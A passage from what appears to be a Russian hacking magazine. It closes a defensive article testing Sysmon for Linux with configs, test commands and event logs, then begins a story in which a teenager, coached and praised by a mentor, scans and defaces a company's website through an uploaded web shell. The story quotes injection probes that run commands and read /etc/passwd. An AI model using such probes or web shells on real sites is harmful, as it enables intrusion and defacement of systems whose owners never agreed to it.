        <!--Event ID 16: ServiceConfigurationChange-->
        <!--Event ID 17: PipeEvent (Pipe Created)-->
        <!--Event ID 18: PipeEvent (Pipe Connected)-->
        <PipeEvent onmatch="exclude"></PipeEvent>
        <!--Event ID 19: WmiEvent (WmiEventFilter activity detected)
-->
        <!--Event ID 20: WmiEvent (WmiEventConsumer activity
detected)-->
        <!--Event ID 21: WmiEvent (WmiEventConsumerToFilter activity
detected)-->
        <WmiEvent onmatch="exclude"></WmiEvent>
        <!--Event ID 22: DNSEvent (DNS query)-->
        <DnsQuery onmatch="exclude"></DnsQuery>
        <!--Event ID 23: FileDelete (A file delete was detected)-->
        <FileDelete onmatch="exclude"></FileDelete>
        <!--Event ID 24: ClipboardChange (New content in the
clipboard)-->
        <ClipboardChange onmatch="exclude"></ClipboardChange>
        <!--Event ID 25: ProcessTampering-->
        <ProcessTampering onmatch="exclude"></ProcessTampering>
        <!--Event ID 26: FileDeleteDetected-->
        <FileDeleteDetected onmatch="exclude"></FileDeleteDetected>
    </EventFiltering>
</Sysmon>

Применим этот конфиг.


sysmon -c almost_all_hunt-naked.xml

Проверить, что правила загрузились, можно командой sysmon -c .


ЭКСПЕРИМЕНТЫ

В винде для проверки можно использовать SysmonSimulator, чтобы сгенери‐
ровать все типы событий и убедиться, что они пишутся в логи. В Linux нам
такой приблуды не завезли, поэтому все руками.
  В чистом XML-представлении вывод выглядел бы вот так:


Sep 06 11:46:02 PADMIN sysmon[2602]: <Event><System><Provider
Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><
EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task>
<Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><
TimeCreated SystemTime="2025-09-06T08:46:02.829056000Z"/><
EventRecordID>2288796</EventRecordID><Correlation/><Execution
ProcessID="2602" ThreadID="2602"/><Channel>Linux-Sysmon/Operational</
Channel><Computer>PADMIN</Computer><Security UserId="0"/></System><
EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2025-09-
06 08:46:06.529</Data><Data Name="ProcessGuid">{218d9a1a-f4ce-68bb-
7db7-d9e08a550000}</Data><Data Name="ProcessId">3235</Data><Data
Name="Image">/usr/bin/systemctl</Data><Data Name="FileVersion">-</
Data><Data Name="Description">-</Data><Data Name="Product">-</Data><
Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><
Data Name="CommandLine">systemctl status sysmon</Data><Data
Name="CurrentDirectory">/root</Data><Data Name="User">root</Data><
Data Name="LogonGuid">{218d9a1a-0000-0000-0000-000000000000}</Data><
Data Name="LogonId">0</Data><Data Name="TerminalSessionId">
4294967295</Data><Data Name="IntegrityLevel">no level</Data><Data
Name="Hashes">
SHA256=c3f60225cf89f20c2f870fd738a6452da820eff730a7e5f05ae03fde1aaa87
6a<
/Data><Data Name="ParentProcessGuid">{00000000-0000-0000-0000-
000000000000}</Data><Data Name="ParentProcessId">2095</Data><Data
Name="ParentImage">-</Data><Data Name="ParentCommandLine">-</Data><
Data Name="ParentUser">-</Data></EventData></Event>

Но лучше почистить его:


sudo tail -f /var/log/syslog | sudo /opt/sysmon/sysmonLogView

Эта команда оставит только важную информацию о событии.


Event SYSMONEVENT_CREATE_PROCESS
        RuleName: -
        UtcTime: 2025-09-06 08:46:06.529
        ProcessGuid: {218d9a1a-f4ce-68bb-7db7-d9e08a550000}
        ProcessId: 3235
        Image: /usr/bin/systemctl
        FileVersion: -
        Description: -
        Product: -
        Company: -
        OriginalFileName: -
        CommandLine: systemctl status sysmon
        CurrentDirectory: /root
        User: root
        LogonGuid: {218d9a1a-0000-0000-0000-000000000000}
        LogonId: 0
        TerminalSessionId: 4294967295
        IntegrityLevel: no level
        Hashes:
SHA256=c3f60225cf89f20c2f870fd738a6452da820eff730a7e5f05ae03fde1aaa87
6a
        ParentProcessGuid: {00000000-0000-0000-0000-000000000000}
        ParentProcessId: 2095
        ParentImage: -
        ParentCommandLine: -
        ParentUser: -

У утилиты SysmonLogView есть несколько полезных ключей.


# Отображать только sysmon Event ID 1
sysmonLogView -e 1


# Отображать только Event ID 2–5
sysmonLogView -r 2,5


# Отобразить события во временном интервале
sysmonLogView -t 2025-09-09 00:00,2025-09-09 15:00


# Фильтр событий по значению поля (но у нас очень часто выводило
ошибки парсинга, на заметку)
sysmonLogView -f Image=/usr/bin/systemctl

Для экспериментов мы будем использовать фильтрацию такого вида:


sudo tail -f /var/log/syslog | sudo /opt/sysmon/sysmonLogView -e 1

Посмотрим, как Sysmon себя покажет.


Создание процесса — Event ID 1
Запустим прослушку порта командой nc -l 9999 и выведем сгенерирован‐
ное событие.


Event SYSMONEVENT_CREATE_PROCESS
        RuleName: -
        UtcTime: 2025-04-01 16:35:43.668
        ProcessGuid: {218d9a1a-15df-67ec-7979-350909560000}
        ProcessId: 9345
        Image: /usr/bin/nc.openbsd
        FileVersion: -
        Description: -
        Product: -
        Company: -
        OriginalFileName: -
        CommandLine: nc -l 9999
        CurrentDirectory: /root/
        User: root
        LogonGuid: {218d9a1a-0000-0000-0000-000000000000}
        LogonId: 0
        TerminalSessionId: 4294967295
        IntegrityLevel: no level
        Hashes: SHA1=4d82414a45e1559c6b06b675bb416c7a6b570430,
MD5=aaade8e2a921e9ac40178a263ebb67e3,
SHA256=2a6fac3d98e090468962ef18003cb8b89fbffa7219917ca12567d5e42b1569
48
        ParentProcessGuid: {00000000-0000-0000-0000-000000000000}
        ParentProcessId: 1555
        ParentImage: -
        ParentCommandLine: -
        ParentUser: -

В событии есть метка времени (сразу в UTC, что немного мешает хантингу
при работе на хосте), PID процесса, командная строка, директория, поль‐
зователь, хеши (чего в auditd не увидеть) и PID родителя. В целом информа‐
ции не так много (вот бы сразу брать имя родительского процесса, нап‐
ример), зато все структурировано.
  Из интересного: команда history не залогировалась, что печально.


Изменение временной метки файла — Event ID 2
Попробуем изменить временную метку файла:


echo > fileName.txt && touch -a -m -t 201512180130.09 fileName.txt

И на всякий случай еще так:


echo > future_file && touch -d 3333120102 future_file

Sysmon ничего не зафиксировал. Предсказуемо, но по‑своему обидно.


Сетевое соединение — Event ID 3
Сделаем простейший запрос:


curl -v https://google.com

И посмотрим результат:


Event SYSMONEVENT_NETWORK_CONNECT
        RuleName: -
        UtcTime: 2025-04-01 16:39:30.522
        ProcessGuid: {218d9a1a-16c2-67ec-8dbe-804b34560000}
        ProcessId: 9521
        Image: /usr/bin/curl
        User: root
        Protocol: tcp
        Initiated: true
        SourceIsIpv6: false
        SourceIp: 192.168.135.3
        SourceHostname: -
        SourcePort: 32796
        SourcePortName: -
        DestinationIsIpv6: false
        DestinationIp: 74.125.71.100
        DestinationHostname: -
        DestinationPort: 443
        DestinationPortName: -

В логах много сетевых соединений, включая локальные — их мы попробуем
отфильтровать на следующем этапе эксперимента. Видим бинарник, IP-адре‐
са источника и назначения и их порты. Из минусов — командную строку все
равно придется искать в связанном событии создания процесса. В auditd,
например, событие запуска процесса и сетевого подключения формируется
под одним идентификатором аудита.
   Также  для  ряда  событий  процесс  (Image)  получал  имя  <unknown
process> , что печально для подсистемы аудита — толку от таких логов мало.


Изменение Sysmon — Event ID 4
Закосим под дурачка и попробуем нагло включить и отключить автостарт
службы Sysmon:


systemctl enable sysmon
systemctl disable sysmon

Нет реакции. Ладно, попробуем просто менять конфигурацию через sysmon
-i .


Event SYSMONEVENT_SERVICE_STATE_CHANGE
        UtcTime: 2025-04-03 16:45:26.270
        State: Started
        Version: 1.3.5
        SchemaVersion: 4.81

В итоге установка и удаление сервиса через sysmon -i и sysmon -u детек‐
тируется, но манипуляции со службой через systemctl, увы, нет.


Процесс завершен — Event ID 5
Теперь прервем запущенный ранее процесс — просто жмем Ctrl-C в окне
с nc -l 9999 .


Event SYSMONEVENT_PROCESS_TERMINATE
        RuleName: -
        UtcTime: 2025-04-01 16:37:02.636
        ProcessGuid: {218d9a1a-15df-67ec-7979-350909560000}
        ProcessId: 9345
        Image: /usr/bin/nc.openbsd
        User: root

Мы получили имя бинарника и PID убитого процесса. Немного, но честная
работа.


Пустышки Event ID 6–8
Эти типы событий в Linux (загрузка драйвера, загрузка образа и создание
удаленного потока) работают иначе, чем в родной для Sysmon Windows,
поэтому и не детектируются. В Linux обычно драйвер — это модуль ядра,
который можно загружать и выгружать. Список модулей и загрузку и выгрузку
любого из них можно получить, например, так:


# Драйвер загружен — Event ID 6
lsmod
modbrobe -rv snd_seq_dummy
modbrobe snd_seq_dummy
rmod snd_seq_dummy




                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИADMIN
     SYSMON В LINUX
           НА ЧТО СПОСОБНА СИСТЕМА
             МОНИТОРИНГА WINDOWS
                   В ЧУЖДОЙ СРЕДЕ





Образ загружен — Event ID 7
Загрузка образа в терминологии Windows — это подгрузка дополнительных
библиотек процессом.


Создание удаленного потока — Event ID 8
Этот тип события отвечает за выявление попыток process injection через
WinAPI. Во всех трех случаях — предсказуемо никакой реакции от Sysmon.


Прямое чтение с диска — Event ID 9
С этим уже интереснее. Прямое чтение с блочных устройств в обход програм‐
мных изоляций — одна из популярных техник злоумышленников . Посмотрим,
какие диски у нас есть, через lsblk и попробуем прочитать первый попав‐
шийся через open /dev/sda.


Event SYSMONEVENT_RAWACCESS_READ
        RuleName: -
        UtcTime: 2025-04-03 17:23:05.024
        ProcessGuid: {218d9a1a-c3f9-67ee-211f-58d5a0550000}
        ProcessId: 14447
        Image: /usr/bin/lynx
        Device: /dev/sda
        User: -

И куда же без старой доброй dd :


dd if=/dev/sda | hexdump -C


Event SYSMONEVENT_RAWACCESS_READ
        RuleName: -
        UtcTime: 2025-04-03 18:19:15.760
        ProcessGuid: {218d9a1a-d123-67ee-210e-2a1c73550000}
        ProcessId: 25942
        Image: /usr/bin/dd
        Device: /dev/sda
        User: -

Опять же без события создания процесса мы фиксируем только факт пря‐
мого обращения к диску, но без привязки к какой‑либо конкретике.


Получен доступ к процессу — Event ID 10
Самый простой способ проверить это — запустить трассировку, например
так: strace cat /etc/passwd.


Event SYSMONEVENT_ACCESS_PROCESS
        RuleName: -
        UtcTime: 2025-04-03 17:33:33.500
        SourceProcessGUID: {218d9a1a-c66d-67ee-5d11-1e7eb4550000}
        SourceProcessId: 17313
        SourceThreadId: 17313
        SourceImage: /usr/bin/strace
        TargetProcessGUID: {00000000-0000-0000-0000-000000000000}
        TargetProcessId: 16412
        TargetImage: -
        GrantedAccess: 0x0
        CallTrace: -
        SourceUser: -
        TargetUser: -
Event SYSMONEVENT_ACCESS_PROCESS
        RuleName: -
        UtcTime: 2025-04-03 17:33:33.502
        SourceProcessGUID: {218d9a1a-c66d-67ee-5d11-1e7eb4550000}
        SourceProcessId: 17313
        SourceThreadId: 17313
        SourceImage: /usr/bin/strace
        TargetProcessGUID: {218d9a1a-c66d-67ee-b1c4-df6db4550000}
        TargetProcessId: 16414
        TargetImage: /usr/bin/cat
        GrantedAccess: 0x0
        CallTrace: -
        SourceUser: root
        TargetUser: root

В зарегистрированных событиях видно, что процесс strace действительно
подключался к cat: факт есть, но что именно происходило — неясно. Также
этот тип не детектировал создание дампов памяти процессов, например
procdump -w chromium .


Создание файла — Event ID 11
С отслеживанием создания файлов Sysmon справляется. Делаем touch
xakep , результат:


Event SYSMONEVENT_FILE_CREATE
        RuleName: -
        UtcTime: 2025-04-03 17:36:36.721
        ProcessGuid: {218d9a1a-c724-67ee-5180-63511f560000}
        ProcessId: 17446
        Image: /usr/bin/touch
        TargetFilename: /root/xakep
        CreationUtcTime: 2025-04-03 17:36:36.721
        User: -

В целом — приемлемо. Но почему не отмечается root-пользователь, непонят‐
но. При работе от любого другого пользователя юзер определяется коррек‐
тно.


Пустышки — Event ID 12–15
Для событий 12–15 (создание или удаление объекта в реестре — 12, изме‐
нение значения параметра реестра — 13, переименование объекта реес‐
тра — 14 и создание файлового потока — 15) Sysmon в Linux ничего
не задетектит: в системе нет реестра, а используется файловая система (ext,
XFS и прочие), отличная от журналируемой NTFS.
   Поэтому едем дальше.


Изменение конфигурации Sysmon — Event ID 16
Попробуем очистить настройки через sysmon -c -- :


Event SYSMONEVENT_SERVICE_CONFIGURATION_CHANGE
        UtcTime: 2025-04-03 17:44:09.505
        Configuration: -
        ConfigurationFileHash: -

И установить новые.


Sysmon -i /home/alex/almost_all_hunt-naked.xml
Event SYSMONEVENT_SERVICE_CONFIGURATION_CHANGE
        UtcTime: 2025-04-03 17:45:18.987
        Configuration: /home/alex/almost_all_hunt-naked.xml
        ConfigurationFileHash: -

Хотя сброс на параметры по умолчанию и не был явно отмечен, по событиям
создания процессов мы все еще можем понять примерный контекст изме‐
нений.


Пустышки — Event ID 17–22
Здесь у нас очередной набор пустышек. Создание именованного канала
(Event ID 17) можно воспроизвести командами mknod xakep_named_pipe p
или mkfifo test_pipe. Попробуем к ним подключиться (Event ID 18):


echo 'SYSMONS DUCKS' > test_pipe &
cat test_pipe

Шум леса, сверчки, шелест травы.
  Для событий, связанных с WMI (Event ID 19, 20, 21), предсказуемо ничего
не будет из‑за проприетарности технологии (ну нет WMI в Linux).
   Большие надежды мы возлагали на Event ID 22 — DNS-запросы: такие
артефакты очень полезны при расследовании киберинцидентов. Но реаль‐
ность полна разочарований: вместо этого в логе — лишь nslookup opera.
com, ping mail.ru , curl -v https://yandex.ru .
   Звенящая пустота, но мы продолжаем двигаться дальше.


Файл удален с сохранением копии — Event ID 23
Просто удалим файл: rm file .


Event SYSMONEVENT_FILE_DELETE
        RuleName: -
        UtcTime: 2025-04-03 17:58:35.876
        ProcessGuid: {218d9a1a-cc4b-67ee-41ea-1e3619560000}
        ProcessId: 23224
        User: -
        Image: /usr/bin/rm
        TargetFilename: /root/MSTIC-Sysmon/linux/filed
        Hashes: -
        IsExecutable: -
        Archived: -

Что интересно, событие 26, которое называется «Удаление файла», как раз
не регистрируется. Но факт удаления зафиксирован — это обнадеживает.


Финальные пустоты — Event ID 24–29, 255
Попробуем обратиться к буферу обмена (Event ID 24) — предсказуемо
не фиксируется ( clip , echo lalka | xclip -sel clip ).
   Изменение образа процесса (Event ID 25). В Linux у нас не получилось
это воспроизвести (попробуй заменить запущенный процесс на лету, ага).
  И удаление файла (Event ID 26) — через touch  supahaker  &&  rm
supahaker — фиксируется в событии 23, но почему‑то не в 26.
  В актуальных сборках для Windows у Sysmon есть события 27 (блокировка
исполняемого  файла), 28  (блокировка  поблочного удаления  файла), 29
(исполняемый файл удален). Но это касается только PE-файлов в Windows.
   Ошибок (код 255) мы тоже не получали во время испытаний.
   Возможности оценили. Установка и первичная настройка выглядят просто,
но, может, есть что‑то покруче? Давай попробуем подсунуть конфигурации
с наворотами — фильтрацией событий и обогащением, хотя бы по техникам
матрицы ATT&CK .


ЭКСПЕРИМЕНТЫ С ОБОГАЩЕНИЕМ КОНФИГОВ

Ссылки на некоторые конфиги для Linux можно найти в статье « Применение
утилиты Sysmon для повышения уровня кибербезопасности » Руслана Рах‐
метова.
   Некоторые приемы и фрагменты конфигурации можешь подсмотреть
в статье Hunting for Persistence in Linux и шпаргалке .
  Для развлечения установим «продвинутую конфигу» из MSTIC и  пос‐
мотрим, как изменится формат вывода.


sysmon -c main.xml

После этого количество генерируемых ивентов резко упало — из‑за кучи
фильтров. А команда crontab отвечает так:


Event SYSMONEVENT_CREATE_PROCESS
        RuleName: TechniqueID=T1053.003,TechniqueName=Scheduled Task/
Job: Cron
        UtcTime: 2025-09-07 13:38:53.801
        ProcessGuid: {30ec4589-8aed-68bd-f152-268a64550000}
        ProcessId: 65293
        Image: /usr/bin/crontab
        FileVersion: -
        Description: -
        Product: -
        Company: -
        OriginalFileName: -
        CommandLine: crontab
        CurrentDirectory: /home/alex
        User: root
        LogonGuid: {30ec4589-0000-0000-0000-000000000000}
        LogonId: 0
        TerminalSessionId: 4294967295
        IntegrityLevel: no level
        Hashes:
SHA256=11651a4bd5c9605dac9df09bcb1ce16e40e740558766081a784e16db0098c0
42
        ParentProcessGuid: {00000000-0000-0000-0000-000000000000}
        ParentProcessId: 22706
        ParentImage: -
        ParentCommandLine: -
        ParentUser: -
Event SYSMONEVENT_FILE_CREATE
        RuleName: TechniqueID=T1053.003,TechniqueName=Scheduled Task/
Job: Cron
        UtcTime: 2025-09-07 13:38:53.821
        ProcessGuid: {30ec4589-8aed-68bd-f152-268a64550000}
        ProcessId: 65293
        Image: /usr/bin/crontab
        TargetFilename: /var/spool/cron/crontabs/tmp.l2DA8v
        CreationUtcTime: 2025-09-07 13:38:53.821
        User: -

Теперь у нас есть поле RuleName , которое позволяет быстрее атрибутировать
активность. Но все же, хоть прошлая конфигурация и была избыточной
(логировала все и писала в громоздком Windows-формате), там сохранялось
много полезных событий для расследования. Откатим настройки на дефол‐
тные: sysmon -c -- .
   Чтобы не заспамить событиями сетевого взаимодействия, можно отфиль‐
тровать локальные обращения — для этого достаточно вставить в конфиг
такой блок:


    <!--Event ID 3: Network connection-->
    <RuleGroup name="" groupRelation="or">
      <NetworkConnect onmatch="exclude">
        <SourceIp>127.0.0.1</SourceIp>
        <DestinationIp>127.0.0.1</DestinationIp>
        <DestinationIp>127.0.1.1</DestinationIp>
      </NetworkConnect>
    </RuleGroup>

Хотя потенциально это может привести к потере части локальных соединений
(привет, Docker и туннели!), в типичных случаях этого достаточно, чтобы
не засорять аудит. В качестве домашнего задания можешь по аналогии
отфильтровать локальные IPv6-адреса (но мы читеры и просто вставили в код
выше строчку вида <SourceIsIpv6>true</SourceIsIpv6> ).


НЕМНОГО ПРО EBPF

Как ты понял, Sysmon for Linux основан на eBPF. Если тебе интересны детали
реализации eBPF в Sysmon, можно  взглянуть на исходный код — там
перечислены, например, основные системные вызовы, которые используются
для формирования записи события в Sysmon. В частности, для создания про‐
цесса — execve, execveat ; создания файла — creat ; открытия файла —
open , openat; удаления файла — unlink, unlinkat ; TCP‑соединений —
accept, accept4 ;  доступа  к  процессу — ptrace; UDP‑соединений —
recvfrom , recvmsg , recvmmsg , read ; закрытия файлового дескриптора —
close .
   Этот список системных вызовов ты можешь взять за основу, чтобы реали‐
зовывать правила для auditd или Tetragon .


ВЫВОДЫ

С одной стороны, приятно, что можно быстро собрать базированную базу:
просто поставить пакет и использовать один конфиг. С другой — инструмент
по пути миграции между операционками потерял значительную часть своей
полезности.
   Чтобы выжать из Sysmon максимум, в конфиге нужно найти баланс: либо
тонуть в куче мусорных событий, либо отфильтровать почти всю активность,
создавая правила для почти каждой известной утилиты — и системной, и той,
что может пригодиться в качестве GTFOBins . Суперконфига (как для Windows )
в Linux пока не видно, да и вряд ли он появится. Дадим еще пару ссылок
на разные конфиги для Sysmon под Linux:
 • Sysmon Modular — набор модульных конфигов Sysmon;
 • Sysmon Config от ion-storm — расширенные правила;
 • Sysmon Config от SwiftOnSecurity — классический базовый набор;
 • MSTIC Sysmon для Linux — официальные конфиги Microsoft.

В итоге фиксируется довольно мало информации, и качество тоже не очень;
из плюсов — все в понятном виде, минимальный набор пригодных для рас‐
следования событий, есть хеши. Но на этом, пожалуй, и все. Так что
как игрушка и потенциальная жертва форков — почему нет. Но мы никогда
не видели, чтобы кто‑то использовал Sysmon for Linux иначе, чем как упражне‐
ние. Но кто знает, это может и измениться. © X
GEEK





— Офиге‑е-еть… — протянул Иван, разглядывая открыв‐
шуюся его взору удручающую картину.


   Удивляться было чему. По игровому залу «Синего экрана» словно прош‐
лась орда варваров: столы и стулья перевернуты, телевизоры сброшены
на пол, хорошо хоть кинескопы не пострадали, в чем Кирилл убедился, осто‐
рожно повернув громоздкие ящики экранами вверх. Две привезенные им
с барахолки игровые приставки куда‑то подевались, но Серёга вскоре обна‐
ружил пропажу в уборной — их засунули в унитаз. А все системные блоки
и мониторы, аккуратно составленные в углу, бесследно исчезли.
 — Это Влад за своим барахлом приходил, — мрачно констатировал Сер‐
гей, — у него запасной ключ есть.
 — Замок надо сменить, — задумчиво произнес Кирилл, — а то он еще раз
явится. И наложит кучу прямо на коврик у входа.
 — Может, ментов вызвать? — предложила Маша, собирая разбросанные
по полу провода.
   Кирилл с сомнением покачал головой:
 — А толку‑то? У нас ничего не пропало, он только свою собственность
забрал. Имеет право. Тем более мы ему сами предложили…
 — Я знаю, где он работает, — мстительно произнес Серёга: парень
переживал этот разгром, кажется, острее других.
  Иван оживился:
 — А давайте его фирму взломаем!
 — И что нам это даст? — поморщился Кирилл, будто от приступа зубной
боли. — Насилие, Ванюша, порождает насилие. Об этом еще Лев Толстой
говорил, умный мужик был, между прочим, хоть и граф.
  На самом деле высказанную Иваном идею Кирилл счел глупой по совер‐
шенно иной причине. Одно дело — подложить свинью бывшему учредителю
клуба и совсем другое — впутывать сюда его работодателя, который тут
совершенно ни при чем. К тому же кто знает, какие связи и возможности
на самом деле есть у этой компании?
 — Чё, зассал? — тут же ощетинился Иван. — Тогда я сам их сайт ломану,
понял?
 — Ты?!
   Кирилл на мгновение представил себе, как Ваня потрошит чужой сайт
с использованием своего волшебного компакт‑диска «Всё для хакера! Софт
для взлома, утилиты, полезности, вирусы», и едва сдержался, чтобы не зас‐
меяться в голос. Это раззадорило подростка еще больше:
 — Чё ржешь? Думаешь, ты один тут крутой? А спорим, я их сайт взломаю
так, что они ничего не прочухают?
 — На что спорим‑то? — все еще давясь от смеха, уточнил Кирилл. — Чур,
свой диск с варезом не предлагать, он у тебя царапаный.
 — На желание! Слабо?
   Кирилл, все еще улыбаясь от уха до уха, молча пожал протянутую парень‐
ком ладонь.
 — Серёга, разбей!
   Ради столь интересного эксперимента Сергей притащил из дома свой
системный блок с виндой, подключив его к клубной локалке, — других ста‐
ционарных компов в «Синем экране» не осталось. Кирилл, пообещавший
потом аккуратно зачистить все следы Ваниной деятельности, мимоходом
подумал,  что  для  офисных  целей  надо  бы  собрать  пару  машин
из какой‑нибудь недорогой комплектухи: компьютеры им все равно понадо‐
бятся. Видимо, придется нанести на радиорынок еще один незапланирован‐
ный визит.
  Тем временем Иван запустил комп, и Киря пристроился у него за спиной,
с любопытством наблюдая за действиями юного взломщика. Похоже, Ваня
все‑таки решил обойтись без купленного в подземном переходе софта:
вместо этого он отправился на «Асталависту» — этот сайт, в отличие от всем
известной «Альтависты», являл собой хакерский каталог с возможностью
поиска всевозможных сплоитов, тулз для взлома, кейгенов, кряков и прочей
«дарквари». Иван скачал оттуда SocksChain — утилиту для повышения ано‐
нимности трафика, предусмотрительно проверил исполняемый файл «Док‐
тором Вебом» и установил софтину на компьютере. Кирилл одобрительно
кивнул: во‑первых, парнишка откуда‑то узнал про популярную среди хакеров
поисковую систему, во‑вторых, заранее озаботился сокрытием сетевых сле‐
дов и  антивирусной безопасностью. Как минимум он не  совсем  без‐
надежен — похоже, парень не просто запускал со своего диска все прог‐
раммы подряд, а искал в сети информацию, читал форумы, учился. Молодец,
далеко пойдет.
 — Прокси каскадируй, — вполголоса посоветовал он, — одного узла
недостаточно.
 — Без тебя знаю, — огрызнулся Ваня-iV1rus.
   Следующий его шаг был вполне предсказуем: парень скачал и запустил
CGI-сканер, любимую игрушку скрипт‑кидди. Большинство веб‑строителей
не заморачивались созданием уникальных программ, которые управляли их
сайтами, а использовали готовые решения. Эти  универсальные движки
содержали массу всевозможных ошибок, а CGI-сканер настырно лез в каж‐
дую щель чужого сайта, проверяя десятки известных уязвимостей — от древ‐
них, как динозавры, до вчерашних, только что утекших с закрытых форумов.
Сканер  поочередно  дергал  подозрительные URL,  подставлял  странные
параметры, скармливал серверу каверзные запросы, надеясь, что тот спот‐
кнется и покажет то, что обычно прячут в самых дальних, пыльных директори‐
ях.
  На экране мелькали строки, похожие на заклинания индейских шаманов:
« /cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd»,        « test.cgi?
cmd=id», « formmail.cgi?recipient= ». Кирилл наблюдал за происходящим
с тем выражением, с каким старшие братья обычно смотрят на младшего,
впервые   пытающегося  починить   сломанную   электрическую   розетку
с помощью канцелярского ножа вместо отвертки: вроде бы и понимаешь, что
сам когда‑то делал то же самое, но все равно интересно, не долбанет ли
естествоиспытателя током.
  Не долбануло: сканер благополучно отработал по цели и выдал несколько
строк. Ваня замер над клавиатурой в нерешительности: смысла полученного
отчета он, похоже, не понимал. Он водил мышью туда‑сюда, будто надеялся,
что озарение вот‑вот придет само собой, если только хорошенько приг‐
лядеться. Кирилл молча улыбался, уже сообразив, что сайт работодателя
Влада оказался не из тех, что поддаются классическому «детскому набору»
для взлома: он был написан не на архаичном Perl и даже не на новомодном
PHP, а на ASP, довольно распространенном, но все же не слишком популяр‐
ном языке. Интересно, что парень будет делать теперь? Надо же, пошел гуг‐
лить. Что ж, молодец, главное правило исследователя он, видимо, уже усво‐
ил: не понимаешь, куда двигаться дальше, поищи решение в интернете.
Признать, что чего‑то не знаешь, — не слабость, а нормальная стадия роста.
Главное ведь не то, что ты умеешь сейчас, а то, насколько быстро готов
разобраться в вещах, о которых не имел ни малейшего представления
еще минуту назад.
  Иван открыл одну статью, вторую, потом нырнул в старенький форум, где
пользователи и админы решали извечные проблемы сайтостроения. Читал он
торопливо, но с каждым абзацем все заметнее хмурился. Кирилл видел, как в
голове у парня строилась картинка: ASP — это не те вольные луга, где дос‐
таточно пнуть слабый скрипт и он сам выдаст тебе пароль от админки. Тут все
иначе,  строже,  серьезнее,  хотя  и  эта  майкрософтовская  технология
не лишена слабых мест.
 — Н‑да… — протянул Ваня, откидываясь на спинку стула. — А чё вообще
с этим делают?
   Кирилл не спешил отвечать. Пусть сам думает, в этом весь смысл обу‐
чения. Отлучился в туалет, по пути включив стоявший прямо на полу электри‐
ческий  чайник, а  когда  вернулся,  увидел, что парень  снова  штудирует
документацию, открыв в браузере уже пятую по счету вкладку. Теперь он
искал иначе, уже не наугад, а методичнее: сначала общие материалы по уяз‐
вимостям в ASP, потом конкретные примеры эксплоитов и отчеты о старых
багах.
 — Поищи скрипты, которые работают с админскими правами, — посове‐
товал Кирилл, — и заодно папки, открытые на запись.
 — Ага… Подожди…
  Он уже не выглядел растерянным. Скорее — азартным: пазл начал понем‐
ногу складываться. Кирилл заметил, как у Ивана изменилось выражение лица:
вместо прежнего раздражения появилась осмысленная сосредоточенность.
Паренек снова посмотрел на отчет сканера, будто увидел там что‑то, что
раньше ускользало от взгляда, потом на исходник веб‑страницы, открытый
в текстовом редакторе.
 — Вот оно! — выдохнул он, ткнув пальцем в экран. — У них форма
обратной связи позволяет сохранить вложение, причем путь прямо в эту
самую форму и зашит. А в целевой папке, похоже, есть права на выполнение
скриптов. Значит, можно…
 — Залить туда веб‑шелл, — закончил за него Кирилл и хлопнул Ивана
по плечу. — Что ж, придумал — действуй.
  Иван уже долбил по клавиатуре, почти не отрываясь от экрана. Языка ASP
он не знал, поэтому скопировал на каком‑то форуме готовый кусок кода
из нескольких строк, загрузил файл через форму, задержав дыхание, словно
отправлял письмо в бутылке через океан. Сервер подумал чуть дольше обыч‐
ного — ровно  настолько, чтобы успеть заставить сердце  дернуться, —
а затем спокойно ответил: «uploaded».
  Иван осел в кресле, но на лице его появилась осторожная радость. Он
вернулся к браузеру, набрал предположительный путь, который вычислил,
сопоставляя код формы обратной связи со структурой сайта.
   Enter.
   Пауза.
   Кирилл уже открыл было рот, чтобы сообщить юному хакеру, что шансы
близки к нулю, но вовремя пресекся.
   Страница открылась. Почти пустая, девственно‑белая, с единственной
строкой ввода: «Hello, world!»
   Маленький шаг для одного человека и огромный прыжок почти до потолка,
который на радостях совершил Иван, едва не свернув на пол клавиатуру.
 — Есть… — прошептал он, и этот тихий звук оказался куда громче любого
победного вопля.
   Теперь можно залить на сайт веб‑шелл — сценарий, который позволит
удаленно выполнить почти любую команду, если, конечно, знаешь, что писать.
Иван еще с минуту сидел неподвижно, будто проверяя, не снится ли ему про‐
исходящее. Только потом руки снова заскользили по клавиатуре. Взгляд
у него стал другим — деловым, собранным, почти взрослым.
 — Не спеши, — негромко сказал Кирилл, — найди подходящий вариант
шелла, внимательно прочти описание. И для начала убедись, что он точно
работает.
  Иван кивнул, не отрываясь от экрана, и снова открыл в браузере «Аста‐
лависту».
   Спустя сорок минут сайт был дефейснут: вместо строгой информации
о  компании  на  главной  странице  появилось  изображение  мартышки
с бананом, глумливо показывающей зрителям задницу. Ниже красовалась
лаконичная надпись: «0wNEd by iV1rus».
 — Поздравляю, — произнес Кирилл спокойно, без привычных для подоб‐
ных случаев восхищенных междометий. — Первый самостоятельный заход. И,
как ни крути, вполне чистый.
  Иван шумно выдохнул, на лице у него застыло странное выражение —
смесь ликования и легкого испуга, будто он только что понял, что нора,
в которую его угораздило засунуть голову, ведет куда глубже, чем казалось
поначалу.
 — Блин… — начал он, но слова не находились. — Я чего, реально сам
это сделал?
 — Сам, — подтвердил Кирилл. — Я только рядом стоял. Но вот начатое ты
пока не закончил, остался один последний шаг.
   Ваня непонимающе уставился на него.
 — Напиши админу, какой именно дырой ты  воспользовался. Пускай
пофиксит.
 — Это еще на фига? — нахохлился Иван.
   Кирилл вздохнул, понимая, что придется снова повторять давно выученные
истины, которые сам он уже считал очевидными.
 — Я тут недавно одну детскую книжку прочитал, вышла лет пять назад, —
начал Киря, мягко постукивая пальцами по столу. — Там мальчишка остался
круглым сиротой, но  внезапно  оказался  волшебником, и его  забрали
в магическую школу. Так вот, учеников в этой школе распределяла по классам
специальная говорящая шляпа: как она скажет, так и сложится твоя судьба.
Момент истины, выбор, который определяет всю дальнейшую жизнь. В нашем
деле тоже есть шляпы, правда, они не говорящие и вообще не настоящие.
Наденешь черную — пойдешь по одному пути, выберешь белую — путь будет
совершенно иным. Черная шляпа — тот, кто оставит на сайте картинку
с макакой и убежит. Не подскажет админу, что у него сервер дырявый, а прос‐
то сделает гадость и будет радоваться. Черные шляпы носят те, у кого внутри
хаос, кто ломает ради самоутверждения или ради денег, не думая, что после
